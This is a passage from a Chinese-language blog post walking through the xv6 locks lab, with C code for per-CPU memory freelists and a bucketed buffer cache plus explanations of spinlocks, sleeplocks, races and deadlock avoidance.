s1 = &amp;lk-&gt;locked</span></span><br><span class="line">  <span class="comment">//   amoswap.w zero, zero, (s1)</span></span><br><span class="line">  __sync_lock_release(&amp;lk-&gt;locked);</span><br><span class="line"></span><br><span class="line">  pop_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>具体来说，在获取<strong>lock</strong>时，其通过循环调用<strong>__sync_lock_test_and_set()</strong>，尝试互斥的将<strong>1</strong>写入共享变量。如果获取的旧值为0，则表明此时还没有其他进程获取锁，并且当前进程已经获取锁(将1写入)；否则表明其他进程已经获取锁，共享变量的值没有改变。</p><p>而释放<strong>lock</strong>时，由于当前进程独占<strong>lock</strong>，则只需执行一次<strong>__sync_lock_release()</strong>，从而将<strong>0</strong>写入共享变量。</p><p>这里需要特别注意，由于自旋锁可能在<strong>进程</strong>和<strong>中断处理</strong>中被使用到，因此需要需要首先关闭中断，从而避免死锁产生(例如获取<strong>tickslock</strong>锁，然后响应时钟中断)</p><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>对于诸如文件系统等，其操作十分耗时，持有自旋锁会导致CPU空转，极大地降低了内核的效率。因此，合理的方式是让当前未成功获取锁的进程睡眠(前面<a href="/2022/07/04/xv6-%E4%B8%83/" title="xv6-七">xv6-七</a>)，直到持有锁的进程释放掉锁，此时在重新获取锁即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">acquiresleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;lk-&gt;lk);</span><br><span class="line">  <span class="keyword">while</span> (lk-&gt;locked) &#123;</span><br><span class="line">    sleep(lk, &amp;lk-&gt;lk);</span><br><span class="line">  &#125;</span><br><span class="line">  lk-&gt;locked = <span class="number">1</span>;</span><br><span class="line">  lk-&gt;pid = myproc()-&gt;pid;</span><br><span class="line">  release(&amp;lk-&gt;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">releasesleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;lk-&gt;lk);</span><br><span class="line">  lk-&gt;locked = <span class="number">0</span>;</span><br><span class="line">  lk-&gt;pid = <span class="number">0</span>;</span><br><span class="line">  wakeup(lk);</span><br><span class="line">  release(&amp;lk-&gt;lk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="Lab-locks"><a href="#Lab-locks" class="headerlink" title="Lab locks"></a>Lab locks</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/lock.html">lab</a>用来加深对于<strong>xv6</strong>的<strong>锁</strong>机制的理解</p><h2 id="Memory-allocator"><a href="#Memory-allocator" class="headerlink" title="Memory allocator"></a>Memory allocator</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Your job is to implement per-CPU freelists, and stealing when a CPU’s free list is empty. You must give all of your locks names that start with “kmem”. That is, you should call <strong>initlock</strong> for each of your locks, and pass a name that starts with “kmem”. Run kalloctest to see if your implementation has reduced lock contention. To check that it can still allocate all of memory, run <strong>usertests sbrkmuch</strong>. Your output will look similar to that shown below, with much-reduced contention in total on kmem locks, although the specific numbers will differ. Make sure all tests in <strong>usertests</strong> pass. <strong>make grade</strong> should say that the kalloctests pass. </p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>避免互斥的最好办法就是避免<strong>竞争</strong>。<br>自然地，为了避免多个CPU在内存分配或释放时，频繁的申请<strong>kmem</strong>的互斥锁，则理想的办法就是<strong>每一个CPU</strong>管理一个自己的内存空闲链表。</p><p>其申请或释放都首先在<strong>当前</strong>CPU对应的空闲链表上进行操作，如果不满足的话再遍历其余的CPU空闲链表即可</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先为<strong>每一个CPU</strong>实现自己的内存空闲链表，通过数组的形式统一进行管理即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 每个CPU一个本地的空闲链表，其下标为CPU对应的cpuid()</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 分配时</span></span><br><span class="line"><span class="comment"> * 首先在本地的空闲链表中进行查找；未找到的话，依次遍历所有CPU的空闲链表</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 释放时</span></span><br><span class="line"><span class="comment"> * 直接释放到本地的空闲链表中即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmems[NCPU];</span><br></pre></td></tr></table></figure></p><p>其次分别实现<strong>申请内存</strong>和<strong>释放内存</strong>的操作即可。<br>对于申请内存，正如前面分析的，首先从当前CPU的空闲链表中尝试获取；如果当前CPU的空闲链表中内存不足的话，则依次遍历周边CPU的内存即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 首先从本地空闲链表中申请内存</span></span><br><span class="line"><span class="comment"> * 需要关中断保证cpuid的正确性</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 如果未申请到，则遍历所有的CPU的空闲链表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span> =</span> (<span class="type">void</span>*)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  push_off();</span><br><span class="line">  <span class="type">int</span> base = cpuid();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCPU &amp;&amp; !r; ++i) &#123;</span><br><span class="line">    <span class="type">int</span> id = (base + i) % NCPU;</span><br><span class="line">    acquire(&amp;kmems[id].lock);</span><br><span class="line">    r = kmems[id].freelist;</span><br><span class="line">    <span class="keyword">if</span>(r)</span><br><span class="line">      kmems[id].freelist = r-&gt;next;</span><br><span class="line">    release(&amp;kmems[id].lock);</span><br><span class="line">  &#125;</span><br><span class="line">  pop_off();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对于释放的话，只需要释放到当前CPU的空闲链表中即可。由于不存在无法释放的情况，则自然和其余CPU的空闲链表结构无关<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将空闲内存释放到CPU的本地空闲链表中</span></span><br><span class="line"><span class="comment"> * 获取cpuid时，需要关中断，保证正确性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line"></span><br><span class="line">  push_off();</span><br><span class="line">  <span class="type">int</span> id = cpuid();</span><br><span class="line">  acquire(&amp;kmems[id].lock);</span><br><span class="line">  r-&gt;next = kmems[id].freelist;</span><br><span class="line">  kmems[id].freelist = r;</span><br><span class="line">  release(&amp;kmems[id].lock);</span><br><span class="line">  pop_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后则是物理内存的初始化，为了最大化的复用原始代码，除了初始化每个CPU的空闲链表结构后，其余基本不变——也就是，一开始所有的内存块都会存储在0号CPU的空闲链表中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kinit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCPU; ++i)</span><br><span class="line">    initlock(&amp;kmems[i].lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该函数仅在内核初始化时调用</span></span><br><span class="line"><span class="comment"> * 此时有且仅有一个进程，则无需上锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">freerange</span><span class="params">(<span class="type">void</span> *pa_start, <span class="type">void</span> *pa_end)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  p = (<span class="type">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="type">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;kalloc&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="memory-allocator实验结果.png" alt="Memory allocator实验结果"></p><h2 id="Buffer-cache"><a href="#Buffer-cache" class="headerlink" title="Buffer cache"></a>Buffer cache</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Modify the block cache so that the number of <strong>acquire</strong> loop iterations for all locks in the bcache is close to zero when running <strong>bcachetest</strong>. Ideally the sum of the counts for all locks involved in the block cache should be zero, but it’s OK if the sum is less than 500. Modify <strong>bget</strong> and <strong>brelse</strong> so that concurrent lookups and releases for different blocks that are in the bcache are unlikely to conflict on locks (e.g., don’t all have to wait for <strong>bcache.lock</strong>). You must maintain the invariant that at most one copy of each block is cached. When you are done, your output should be similar to that shown below (though not identical). Make sure usertests still passes. <strong>make grade</strong> should pass all tests when you are done. </p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>buffer cache</strong>是文件系统中的重要抽象，其主要用于缓冲磁盘数据。其结构如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/buf.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buf</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> valid;   <span class="comment">// has data been read from disk?</span></span><br><span class="line">  <span class="type">int</span> disk;    <span class="comment">// does disk &quot;own&quot; buf?</span></span><br><span class="line">  uint dev;</span><br><span class="line">  uint blockno;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span></span><br><span class="line">  uint refcnt;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">prev</span>;</span> <span class="comment">// LRU cache list</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">next</span>;</span></span><br><span class="line">  uchar data[BSIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>对于<strong>buffer cache</strong>，我们目前不需要了解太多，只需要明确如下几点即可</p><ol><li>为了避免频繁读取磁盘内容到<strong>buffer cache</strong>中，在为磁盘分配<strong>cache</strong>时采用<strong>Least Recently Used</strong>策略，并通过链表实现</li><li>每个磁盘的一个块只能有一个<strong>cache</strong>(linux内核貌似不是这样的机制?)，否则会导致程序读取磁盘数据不一致</li><li>可以将<strong>buffer cache</strong>简单理解为<strong>内存</strong>，其提供<strong>申请</strong>和<strong>释放</strong>功能</li></ol><p>类似于前面的内存分配，为了避免多个CPU在<strong>buffer cache</strong>分配或释放时，频繁的申请<strong>bcache</strong>的互斥锁，则理想的办法就是分成多个<strong>bucket</strong>(这里通过<strong>blockno</strong>获取在<strong>bucket</strong>中的下标)。</p><p>同样的，其申请或释放都首先在<strong>当前bucket</strong>对应的LRU链上进行操作，如果不满足的话再遍历其余的LRU链表即可</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>首先为每个<strong>bucket</strong>实现对应的数据结构，并同样通过数组的形式统一进行管理<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/param.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFBUCKET    13  <span class="comment">// 将buffer cache按照blockno，分成不同的bucket并进行访问</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Linked list of buffers in same bucket, through prev/next.</span></span><br><span class="line">  <span class="comment">// Sorted by how recently the buffer was used.</span></span><br><span class="line">  <span class="comment">// head.next is most recent, head.prev is least.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">heads</span>[<span class="title">BUFBUCKET</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">locks</span>[<span class="title">BUFBUCKET</span>];</span></span><br><span class="line"></span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure></p><p>其次，实现申请<strong>buffer cache</strong>的算法。这里需要特别注意锁的使用，注意如下几点</p><ol><li>避免条件竞争：由于整个申请分为两部分——在当前<strong>bucket</strong>搜索和在其余<strong>bucket</strong>中搜索。则如果在中间时刻释放锁，则可能因为条件竞争导致一个block有多个<strong>buffer cache</strong>对应</li><li>避免死锁：如果为了避免上述条件竞争，而在持有当前<strong>bucket</strong>锁的基础上，申请其余<strong>bucket</strong>锁，则会导致死锁产生<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Look through buffer cache for block on device dev.</span></span><br><span class="line"><span class="comment">// If not found, allocate a buffer.</span></span><br><span class="line"><span class="comment">// In either case, return locked buffer.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> buf*</span><br><span class="line"><span class="title function_">bget</span><span class="params">(uint dev, uint blockno)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="type">int</span> base = blockno % BUFBUCKET;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Is the block already cached?</span></span><br><span class="line">  acquire(&amp;bcache.locks[base]);</span><br><span class="line">  <span class="keyword">for</span>(b = bcache.heads[base].next; b != &amp;bcache.heads[base]; b = b-&gt;next)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      release(&amp;bcache.locks[base]);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached.</span></span><br><span class="line">  <span class="comment">// Recycle the least recently used (LRU) unused buffer.</span></span><br><span class="line">  <span class="keyword">for</span>(b = bcache.heads[base].prev; b != &amp;bcache.heads[base]; b = b-&gt;prev) &#123;</span><br><span class="line">    <span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span>) &#123;</span><br><span class="line">      b-&gt;dev = dev;</span><br><span class="line">      b-&gt;blockno = blockno;</span><br><span class="line">      b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      release(&amp;bcache.locks[base]);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;bcache.locks[base]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; BUFBUCKET; ++i) &#123;</span><br><span class="line">    <span class="type">int</span> idx = (base + i) % BUFBUCKET;</span><br><span class="line"></span><br><span class="line">    acquire(&amp;bcache.locks[idx]);</span><br><span class="line">    <span class="keyword">for</span>(b = bcache.heads[idx].prev; b != &amp;bcache.heads[idx]; b = b-&gt;prev) &#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span>) &#123;</span><br><span class="line">        b-&gt;dev = dev;</span><br><span class="line">        b-&gt;blockno = blockno;</span><br><span class="line">        b-&gt;valid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// unlink the buf from idx bucket</span></span><br><span class="line">        b-&gt;prev-&gt;next = b-&gt;next;</span><br><span class="line">        b-&gt;next-&gt;prev = b-&gt;prev;</span><br><span class="line">        release(&amp;bcache.locks[idx]);</span><br><span class="line"></span><br><span class="line">        acquire(&amp;bcache.locks[base]);</span><br><span class="line">        <span class="comment">// insert the buf as least recently used cache</span></span><br><span class="line">        b-&gt;next = &amp;bcache.heads[base];</span><br><span class="line">        b-&gt;prev = bcache.heads[base].prev;</span><br><span class="line">        bcache.heads[base].prev-&gt;next = b;</span><br><span class="line">        bcache.heads[base].prev = b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(b = bcache.heads[base].next; b != &amp;bcache.heads[base]; b = b-&gt;next) &#123;</span><br><span class="line">          <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">            b-&gt;refcnt++;</span><br><span class="line">            release(&amp;bcache.locks[base]);</span><br><span class="line">            acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        release(&amp;bcache.locks[base]);</span><br><span class="line">        panic(<span class="string">&quot;bget: code can&#x27;t arrive here!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;bcache.locks[idx]);</span><br><span class="line">  &#125;</span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>释放<strong>buffer cache</strong>的逻辑就很简单，直接释放到当前<strong>bucket</strong>中即可，需要注意插入的顺序即可(即LRU策略)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Release a locked buffer.</span></span><br><span class="line"><span class="comment">// Move to the head of the most-recently-used list.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">brelse</span><span class="params">(<span class="keyword">struct</span> buf *b)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx = b-&gt;blockno % BUFBUCKET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line"></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  acquire(&amp;bcache.locks[idx]);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  <span class="keyword">if</span> (b-&gt;refcnt == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// no one is waiting for it.</span></span><br><span class="line">    b-&gt;next-&gt;prev = b-&gt;prev;</span><br><span class="line">    b-&gt;prev-&gt;next = b-&gt;next;</span><br><span class="line">    b-&gt;next = bcache.heads[idx].next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.heads[idx];</span><br><span class="line">    bcache.heads[idx].next-&gt;prev = b;</span><br><span class="line">    bcache.heads[idx].next = b;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;bcache.locks[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">最后则是初始化，基本和原始的代码一致。其需要特别为每个**bucket**的相关数据结构进行初始化即可，并且一开始将所有的**buffer cache**放置在**bucket0**中</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">binit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; BUFBUCKET; ++i) &#123;</span><br><span class="line">    initlock(&amp;bcache.locks[i], <span class="string">&quot;bcache.bucket&quot;</span>);</span><br><span class="line">    <span class="comment">// Create linked list of buffers</span></span><br><span class="line">    bcache.heads[i].prev = &amp;bcache.heads[i];</span><br><span class="line">    bcache.heads[i].next = &amp;bcache.heads[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++) &#123;</span><br><span class="line">    b-&gt;next = bcache.heads[<span class="number">0</span>].next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.heads[<span class="number">0</span>];</span><br><span class="line">    initsleeplock(&amp;b-&gt;lock, <span class="string">&quot;buffer&quot;</span>);</span><br><span class="line">    bcache.heads[<span class="number">0</span>].next-&gt;prev = b;</span><br><span class="line">    bcache.heads[<span class="number">0</span>].next = b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-1"><a href="#结果-1" class="headerlink" 